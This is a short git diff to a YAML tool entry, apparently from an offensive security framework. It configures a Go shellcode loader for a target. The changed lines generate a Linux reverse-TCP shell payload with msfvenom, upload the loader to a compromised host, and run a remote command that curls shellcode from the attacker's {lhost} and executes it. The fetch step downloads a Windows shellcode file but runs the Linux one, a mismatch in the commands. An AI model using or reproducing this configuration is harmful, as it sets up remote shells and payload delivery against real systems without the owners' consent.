@@ -18,4 +18,6 @@ tool:
   repo_url: https://github.com/grisuno/gomulti_loader.git
   install_path: external/.exploit/gomulti_loader
   install_command: make linux
-  execute_command: msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o shellcode_test.txt ; ./loader_linux -shellcode shellcode_test.txt
+  execute_command: msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o ../../../sessions/shellcode_linux.txt
+  upload_file: no_priv ./external/.exploit/cgoblin/loader_linux
+  remote_command: no_priv curl -o shellcode_windows.txt https://{lhost}/shellcode_windows.txt ; ./loader_linux -shellcode shellcode_linux.txt
